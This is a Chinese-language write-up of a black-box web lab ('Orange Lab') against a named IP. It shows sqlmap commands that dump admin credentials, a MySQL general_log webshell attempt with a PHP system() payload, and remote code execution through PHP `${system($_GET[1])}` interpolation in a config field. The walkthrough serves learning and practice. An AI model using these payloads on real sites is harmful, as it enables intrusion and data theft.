---
date: '2026-03-09'
draft: false
title: "Orange Lab"
tags: [ "web"]
---
# Orange Lab

## Web Interface

![image](/images/post-images/ol-web-interface-1.png)

註冊後登入

![image](/images/post-images/ol-web-interface-2.png)

點其中一篇文章 URL 顯示：http://43.206.220.120:8080/show.php?id=20

![image](/images/post-images/ol-web-interface-3.png)

誰來我家可以看到有一個 admin 帳號

![image](/images/post-images/ol-web-interface-4.png)

## Find admin password
先用 sqlmap 砸下去找到 admin password

1. 先列出所有資料庫
```bash
┌──(penguin㉿kali)-[~]
└─$ sqlmap -u "http://43.206.220.120:8080/show.php?id=33" --dbs
available databases [4]:                                    
[*] information_schema
[*] mydb
[*] mysql
[*] performance_schema
```

2. 列出特定資料庫中的所有資料表
```bash
──(penguin㉿kali)-[~]
└─$ sqlmap -u "http://43.206.220.120:8080/show.php?id=33" --D mydb --tables
Database: mydb                                              
[4 tables]
+-------------+
| admin       |
| cron_bypass |
| exploit     |
| news        |
+-------------+
```

3. 取得欄位資訊
```bash
┌──(penguin㉿kali)-[~]
└─$ sqlmap -u "http://43.206.220.120:8080/show.php?id=33" -D mydb -T admin -columns
Database: mydb                                              
Table: admin
[3 columns]
+----------+--------+
| Column   | Type   |
+----------+--------+
| id       | int(8) |
| password | text   |
| username | text   |
+----------+--------+
```

4. Dump 出資料
```bash
┌──(penguin㉿kali)-[~]
└─$ sqlmap -u "http://43.206.220.120:8080/show.php?id=33" -D mydb -T admin -C "id,password,username" --dump --batch
+----+----------------------------------+----------+
| id | password                         | username |
+----+----------------------------------+----------+
| 1  | 1b6102adeadc2e0d907489063d245e54 | admin    |
| 2  | 000209                           | penguin  |
+----+----------------------------------+----------+
```

得到 admin password:`1b6102adeadc2e0d907489063d245e54`，拿去登入後看到以下頁面

點開配置頁面發現資料庫 user(`root`) 和 password(`rootpassword`)

![image](/images/post-images/ol-db-1.png)

## WebShell 撞牆記

### 第一階段撞牆(烏青)

1. 要開 web shell 前提條件:

- `secure_file_priv` 變數必須為空
- 知道 Web 根目錄（例如 `/var/www/html`）

做第一步驗證，先進入 mysql 以 root 登入後查看 `secure_file_priv` 
```bash
MySQL [(none)]> SHOW VARIABLES LIKE "secure_file_priv";
+------------------+-----------------------+
| Variable_name    | Value                 |
+------------------+-----------------------+
| secure_file_priv | /var/lib/mysql-files/ |
+------------------+-----------------------+
```
:::info
mysql 中對於匯入匯出的檔案路徑有限制。一般來說分為三種:
1. 指定目錄 : 只允許在特定目錄操作
2. NULL : 完全禁止文件操作
3. 空值 : 可以進行任意操作
:::


`secure_file_priv` 被設定在 `/var/lib/mysql-files/`，代表無法將 Webshell 寫入`/var/www/html/` 或其他地方


但還是抱持著不信邪的想法試著戳了一次 :clown_face: 

先把 log 設置成合法路徑
```bash
MySQL [(none)]> SET GLOBAL general_log = 'on';
Query OK, 0 rows affected (0.046 sec)
```

嘗試在 `/var/www/html/` 寫入 shell 但失敗

```bash
MySQL [(none)]> SET GLOBAL general_log_file = '/var/www/html/test_shell.php'; 
ERROR 1231 (42000): Variable 'general_log_file' can't be set to the value of '/var/www/html/test_shell.php'
```

換個目錄寫

```bash
MySQL [(none)]> SET GLOBAL general_log_file = '/tmp/web_shell.php';
Query OK, 0 rows affected (0.047 sec)

MySQL [(none)]> SELECT LOAD_FILE('/tmp/web_shell.php');
+----------------------------------+
| LOAD_FILE('/tmp/web_shell.php') |
+----------------------------------+
| NULL                             |
+----------------------------------+
1 row in set (0.045 sec)
```
其實看到 NULL 就知道大概是沒開成功
毫不意外的失敗了，主要還是因為 `secure_file_priv` 的問題

既然 `secure_file_priv` 的目錄是在 `/var/lib/mysql-files/`，那如果寫到他下面呢
```bash
MySQL [(none)]> SET GLOBAL general_log_file = '/var/lib/mysql-files/shell.php';
Query OK, 0 rows affected (0.049 sec)

MySQL [(none)]> SELECT '<?php system($_GET["cmd"]); ?>';
+--------------------------------+
| <?php system($_GET["cmd"]); ?> |
+--------------------------------+
| <?php system($_GET["cmd"]); ?> |
+--------------------------------+
1 row in set (0.046 sec)

MySQL [(none)]> SELECT LOAD_FILE('/var/lib/mysql-files/shell.php');
+---------------------------------------------+
| LOAD_FILE('/var/lib/mysql-files/shell.php') |
+---------------------------------------------+
| NULL                                        |
+---------------------------------------------+
1 row in set (0.044 sec)
```

去訪問 `http://43.206.220.120:8080/admin/index.php?module=../../../../../var/lib/mysql-files/shell&cmd=id`
沒有顯示 id，並且發現 path traversal 也被過濾掉了

事後思考了為甚麼寫在 `/var/lib/mysql-files/` 底下也依然無法存到，一開始猜測是因為執行權限的問題，雖然寫到目錄下面，也有 root 權限，但沒有執行權限

就算寫了 `<?php system($_GET["cmd"]); ?>` 進去也只是 text

結果最後才知道根本是 db 和 web 不同台 :clown_face: 

![image](/images/post-images/ol-db-2.png)

這部分可以用 user() 來確認

```bash
MySQL [information_schema]> select user(),@@hostname
    -> ;
ERROR 2006 (HY000): Server has gone away
No connection. Trying to reconnect...
Connection id:    4260
Current database: information_schema

+---------------------+--------------+
| user()              | @@hostname   |
+---------------------+--------------+
| root@61.231.234.115 | 42ff3f796471 |
+---------------------+--------------+
```
一般來說如果同台會顯示 `root@localhost` 之類的


### 第二階段撞牆(不存在的 LFI)

過程中一直想試 LFI，但都沒料

第一個是會過濾掉 `..`

第二個就是他後綴都會加上 `.php`

不過其實有更快的方法 -> **看前綴可不可控**

透過 `module=login` 和 `module=./login` 來判斷有沒有潛在的 LFI

如果 `module=./login` 可以，接下來可能會想試 `../` 或是 `....//`
 
但是 `module=logi..n` 跟 `module=login` 呈現的畫面一樣，就知道會取代 .. -> 空

這時如果前綴不可控的話就能馬上跳過 LFI 了

### 第三階段撞牆(Get 存證信函)

接下來把目標放在配置頁面

不是很敢改掉 root 和 password，怕真的搞掛

不過還是手賤改了一次結果真的掛了 XD

但好像是橘子機器開太小(?

![image](/images/post-images/ol-machine-1.png)

雖然最後也是搞掛，抱歉還讓橘子加班 XD

![image](/images/post-images/ol-machine-2.png)

接下來就把重點放到 title 和 background color 上

嘗試了幾個 payload 後找出一些規則
1. `'>aaa` 看到 `\'>aaa` 表示有對 `'` 或類似的引號做處理( addslash() 之類的)
2. 輸入 `"<?php echo 1>` 之類的發現沒有被執行，可能代表只影響 HTML 的結構(透過前端看到)，但是沒有被當成 PHP 執行，只是普通字串
3. **收存證信函的時刻來了**，在 title 的地方放了 `"><script language="php">echo $_GET['cmd']</script>` 這個 payload 後噴了一個看起來很恐怖的 error

![image](/images/post-images/ol-error.png)

![image](/images/post-images/ol-error-2.png)

事後看 source code 分析原因

部分 source code 如下:
:::spoiler source code
```php
$data = <<<EOF
<?php

    $website_title   = "$_website_title";
    $website_bgcolor = "$_website_bgcolor";

?>
EOF;
```
::: 

如果塞入上面那串 payload PHP 會解析成

```php=
$website_title
=
""
>
<script language="php">
echo $_GET['cmd']
</script>
"
;
```
第4行的 `>` 對 PHP 而言不是合法 token，所以會出現 parse error


### 第三次嘗試(Get shell)
很奇怪的是如果放 `"><? php echo 1>` 又沒事，標題變成
![image](/images/post-images/ol-rce-1.png)

看前端也只是變成 
![image](/images/post-images/ol-rce-2.png)

會變成註解的原因是因為 HTML 看不懂這個語法，所以覺得 `$` 在這之間扮演重要角色

再來就是 PHP 的 `${...}` 可以字串中插入複雜變數
所以如果塞入 `${phpinfo()}` 

![image](/images/post-images/ol-info.png)

有點東西
同樣的邏輯要開 shell 的話就改成 `${system($_GET[1])}`

![image](/images/post-images/ol-shell.png)

終於呀哈

接著帶參數上去就可以執行 shell 啦
http://43.206.220.120:8080/admin/?module=para&1=ls

![image](/images/post-images/ol-ls.png)

而會成功的根本原因是這裡使用了雙引號

在 PHP 中雖然單雙引號都可以表示字串，但雙引號還有一個特性是會把引號內的內容作第二次解析

例如:

```php
<?php

echo "123\n";
$a = '${@print(456)}';
echo $a;
echo "\n";
$a = "{${@print(11111)}}";
echo "---";
```

output:
![image](/images/post-images/ol-php.png)

可以看出當 a 是單引號包住時會以純字串輸出

但如果是雙引號會執行裡面的操作

事後去看 source code 也證實是這個原理

![image](/images/post-images/ol-source-code.png)


## 心得後記

是人生第一次嘗試黑箱題，以前看到黑箱就是跑走完全不敢解

雖然中間過程有點久，大概20小時(?)

但可以打出來還是很開心，事後和橘子求解也學到很多東西

希望自己能學得再快點，爭取大四下考過 OSWE XD

(還有要存錢TAT)


## Ref (By Orange)
[漏洞复现之DouPHP_v1.5_Release_20190711cms代码执行漏洞的利用与防御](https://blog.csdn.net/weixin_64551911/article/details/123690065)

[PHP中双引号引起的命令执行漏洞](https://www.0x002.com/2018/PHP%E4%B8%AD%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%BC%95%E8%B5%B7%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/)
